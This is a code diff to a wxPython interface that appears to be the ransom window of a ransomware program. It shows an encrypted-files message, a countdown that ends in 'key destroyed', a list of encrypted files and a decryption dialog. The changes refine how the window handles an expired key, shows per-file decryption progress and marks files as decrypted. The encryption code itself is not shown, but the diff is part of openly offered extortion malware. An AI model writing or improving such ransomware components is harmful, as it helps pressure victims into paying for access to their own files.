@@ -27,6 +27,7 @@ import time
 
 import wx
 import wx.xrc
+import os
 
 ###########################################################################
 ## Class MyFrame1
@@ -94,7 +95,7 @@ class MyFrame1 ( wx.Frame ):
         bSizer15.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
         
         self.m_bitmap5 = wx.StaticBitmap( self.m_panel33, wx.ID_ANY, wx.Bitmap( u"%s\\encrypt_message.bmp" % self.image_path, wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.DefaultSize, 0 )
-        bSizer15.Add( self.m_bitmap5, 0, wx.ALL, 5 )
+        bSizer15.Add( self.m_bitmap5, 0, wx.ALL|wx.EXPAND|wx.ALIGN_CENTER_HORIZONTAL, 5 )
         
         
         bSizer15.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
@@ -296,9 +297,16 @@ class MyFrame1 ( wx.Frame ):
             self.message  = "blank"
             
         # Update the time remaining
-        self.m_staticText17.SetLabelText((self.time_remaining()))
-
-        
+        time_remaining = self.time_remaining()
+        self.m_staticText17.SetLabelText(time_remaining)
+       
+        # If the key has been destroyed, update the menu
+        if time_remaining.lower() == "key destroyed":
+            # Set timer color to black
+            self.m_staticText17.SetForegroundColour( wx.SystemSettings_GetColour(wx.SYS_COLOUR_CAPTIONTEXT))
+            # Disable the decryption button
+            self.m_button11.Disable()
+            
     
     def __del__( self ):
         pass
@@ -312,7 +320,7 @@ class MyFrame2 ( wx.Frame ):
     
     def __init__( self, parent, file_path_list ):
         self.file_path_list = file_path_list
-        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,300 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL|wx.STAY_ON_TOP )
+        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 600,400 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL|wx.STAY_ON_TOP )
         
         self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
         
@@ -322,7 +330,15 @@ class MyFrame2 ( wx.Frame ):
         bSizer13 = wx.BoxSizer( wx.VERTICAL )
         
         self.m_textCtrl1 = wx.TextCtrl( self.m_panel13, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_DONTWRAP|wx.TE_MULTILINE|wx.TE_READONLY )
-        self.m_textCtrl1.LoadFile(self.file_path_list)
+        
+        # IF file exists, load the encrypted files list
+        if os.path.isfile(self.file_path_list):
+            self.m_textCtrl1.LoadFile(self.file_path_list)
+        # Otherwise, set to none found
+        else:
+            self.m_textCtrl1.SetLabelText("A list of encrypted files was not found.")
+            
+        
         bSizer13.Add( self.m_textCtrl1, 3, wx.ALL|wx.EXPAND, 5 )
         
         
@@ -349,7 +365,8 @@ class MyDialog1 ( wx.Dialog ):
     
     def __init__( self, parent, decrypter ):
         self.decrypter = decrypter
-        wx.Dialog.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,200 ), style = wx.DEFAULT_DIALOG_STYLE|wx.STAY_ON_TOP )
+        self.parent = parent
+        wx.Dialog.__init__ ( self, self.parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,200 ), style = wx.DEFAULT_DIALOG_STYLE|wx.STAY_ON_TOP )
         
         self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
         
@@ -432,10 +449,36 @@ class MyDialog1 ( wx.Dialog ):
             self.m_staticText6.SetLabelText("Decrypting! Please Wait")
             
         # Now start the decryption 
-        self.decrypter.decrypt_files()
-        self.m_gauge1.SetValue(100)
+        # Get list of encrypted files and update the Gauge max value
+        encrypted_file_list = self.decrypter.get_encrypted_file_list()
+        self.m_gauge1.SetRange(len(encrypted_file_list))
+
+        # Iterate file list and decrypt
+        decrypted_file_list = []
+        for encrypted_file in encrypted_file_list:
+            self.decrypter.decrypt_file(encrypted_file)
+            decrypted_file_list.append(encrypted_file)
+            self.m_gauge1.SetValue(len(decrypted_file_list))
+            wx.Yield()
+            
+        # Decryption complete. Update message and delete list
         self.m_staticText6.SetLabelText("Decryption Complete!")
-    
+        self.decrypter.cleanup()
+        
+        # Disable decrypt button
+        self.m_sdbSizer1OK.Disable()
+
+        # Update main window
+        self.parent.m_timer2.Stop()
+        self.parent.m_bitmap5.SetBitmap(wx.Bitmap( u"%s\\decrypt_message.bmp" % self.parent.image_path, wx.BITMAP_TYPE_ANY))
+        self.parent.m_staticText17.SetLabelText("FILES DECRYPTED")
+        self.parent.m_staticText17.SetForegroundColour( wx.Colour(2, 217, 5) )
+        
+        # Disable decrypt button
+        self.parent.m_button11.Disable()
+        
+        
+        
     def __del__( self ):
         pass
     
